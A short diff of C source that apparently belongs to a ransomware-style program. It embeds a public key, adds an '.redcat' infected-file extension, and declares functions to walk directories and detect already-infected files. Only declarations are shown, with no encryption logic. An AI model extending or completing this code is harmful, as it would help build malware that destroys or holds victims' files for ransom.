@@ -42,10 +42,12 @@
     "Xp+fw3+twf+tXCnF0ljT4vW+Cxx7YqOrKIvN58SlVjG1GhNN63dlRwKqa5pKe9fB\n" \
     "SkVPW+yTAMU+nB6QtZbluW+OFqR5kDbisQwBhCLjv+aodrMKQraRiy8ajOwDkMOd\n" \
     "BUhaUPlEJGIFfpI0XB7J6CkCAwEAAQ==\n" \
-    "-----END PUBLIC KEY-----" \
+    "-----END PUBLIC KEY-----"
+#define INFECTED_FILE_EXT ".redcat"
 
 /* Prototype of functions */
 void print_usage();
+int is_infected_file(char* path);
 int is_valid_options(int* key_size, char* mode, char* target);
 void walkdir(cvector_vector_type(char*)* paths, char* parent_dir);
 int parse_options(int* key_size, char* mode, char* target, int argc, char** argv);
